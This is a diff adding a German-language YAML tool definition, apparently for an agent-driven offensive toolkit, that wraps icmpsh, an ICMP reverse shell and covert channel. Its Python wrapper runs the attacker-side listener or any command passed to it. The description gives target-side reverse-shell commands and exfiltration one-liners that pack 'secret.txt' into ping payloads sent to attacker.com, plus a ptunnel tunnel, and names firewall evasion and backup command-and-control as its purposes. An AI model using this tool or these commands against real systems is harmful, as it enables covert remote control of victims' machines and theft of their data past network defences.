@@ -1,0 +1,109 @@
+name: "icmpsh"
+command: "python3"
+args:
+  - "-c"
+  - |
+    import subprocess
+    import sys
+    import shlex
+    import os
+
+    if len(sys.argv) < 2:
+        sys.stderr.write("Kein icmpsh-Modus angegeben\n")
+        sys.exit(1)
+
+    mode = sys.argv[1]
+    extra = sys.argv[2] if len(sys.argv) > 2 else ""
+
+    if mode == "listener":
+        # ICMP Listener (Empfänger auf Angreifer-Seite)
+        # Sysctl konfigurieren (ICMP-Antworten unterdrücken)
+        subprocess.run(["sysctl", "-w", "net.ipv4.icmp_echo_ignore_all=1"], check=False)
+        cmd = ["icmpsh_m.py"]
+        if extra:
+            cmd.extend(shlex.split(extra))
+        proc = subprocess.run(cmd, capture_output=True, text=True)
+    elif mode == "cleanup":
+        subprocess.run(["sysctl", "-w", "net.ipv4.icmp_echo_ignore_all=0"], check=False)
+        sys.stdout.write("ICMP echo restored\n")
+        sys.exit(0)
+    else:
+        cmd = shlex.split(mode)
+        if extra:
+            cmd.extend(shlex.split(extra))
+        proc = subprocess.run(cmd, capture_output=True, text=True)
+
+    if proc.stdout:
+        sys.stdout.write(proc.stdout)
+    if proc.stderr:
+        sys.stderr.write(proc.stderr)
+    sys.exit(proc.returncode)
+enabled: true
+short_description: "icmpsh – ICMP Reverse Shell & Covert Channel via ICMP Echo"
+description: |
+  icmpsh implementiert eine Reverse Shell über ICMP-Echo-Pakete (Ping).
+  Ideal für Umgebungen, die nur ICMP-Traffic erlauben. Ermöglicht verdeckte
+  Kommunikation und Exfiltration über ICMP-Tunnel.
+
+  **Hauptfunktionen:**
+  - Reverse Shell via ICMP Echo Request/Reply
+  - Covert Channel für Daten-Exfiltration
+  - Umgehung von Firewalls die TCP/UDP blockieren
+  - Kein Listening-Port auf Angreifer-Seite erforderlich (ICMP)
+  - Unterstützt Windows und Linux Ziele
+
+  **Setup auf Angreifer-Seite (Listener):**
+  ```bash
+  # ICMP-Antworten deaktivieren (wichtig!)
+  sysctl -w net.ipv4.icmp_echo_ignore_all=1
+
+  # Listener starten
+  python3 icmpsh_m.py <attacker_ip> <target_ip>
+  ```
+
+  **Auf Zielsystem (Windows):**
+  ```cmd
+  icmpsh.exe -t <attacker_ip> -d 500 -b 30 -s 128
+  ```
+
+  **Auf Zielsystem (Linux):**
+  ```bash
+  ./icmpsh -t <attacker_ip>
+  ```
+
+  **Exfiltration via ICMP:**
+  ```bash
+  # Daten in ICMP-Payload einbetten
+  ping -p $(xxd -p secret.txt | head -c 16) -c 1 attacker.com
+
+  # Mit ptunnel für vollständigen Tunnel
+  ptunnel -p attacker.com -lp 8080 -da internal.host -dp 80
+  ```
+
+  **Verwendungsszenarien:**
+  - Kommunikation durch strikte Firewalls
+  - Exfiltration in ICMP-erlaubten Netzwerken
+  - Covert Channel als Backup-C2
+
+  **Hinweise:**
+  - Root-Rechte auf Angreifer-Seite erforderlich
+  - ICMP oft weniger gefiltert als TCP/UDP
+  - Cleanup: `sysctl -w net.ipv4.icmp_echo_ignore_all=0`
+parameters:
+  - name: "mode"
+    type: "string"
+    description: |
+      Betriebsmodus:
+      - `listener <attacker_ip> <target_ip>` – ICMP-Listener starten
+      - `cleanup` – ICMP-Echo-Ignore zurücksetzen
+      - Für Client-Deployment exec-Tool auf Zielsystem verwenden
+    required: true
+    position: 0
+    format: "positional"
+  - name: "additional_args"
+    type: "string"
+    description: "Weitere Argumente"
+    required: false
+    default: ""
+    position: 1
+    format: "positional"
